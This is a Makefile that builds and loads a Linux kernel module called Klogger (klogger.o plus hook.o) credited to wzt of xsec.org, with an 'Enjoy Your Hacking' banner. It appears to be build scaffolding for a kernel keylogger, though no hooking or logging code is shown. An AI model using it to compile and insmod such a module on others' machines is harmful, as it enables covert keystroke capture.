obj-m += klogger2.o
klogger2-objs := klogger.o hook.o
KERNELBUILD := /lib/modules/$(shell uname -r)/build

default:
	@echo
	@echo "+-----------------------------------------------------------+"
	@echo "			Klogger Version 1.4                         "
	@echo "			By wzt <xsec.org>                           "
	@echo "			Enjoy Your Hacking                          "
	@echo "+-----------------------------------------------------------+"
	@echo

	make -C $(KERNELBUILD) M=$(shell pwd) modules

install:
	insmod ./klogger2.ko
clean:
	rm -f *.o *.cmd *.ko *.mod.c
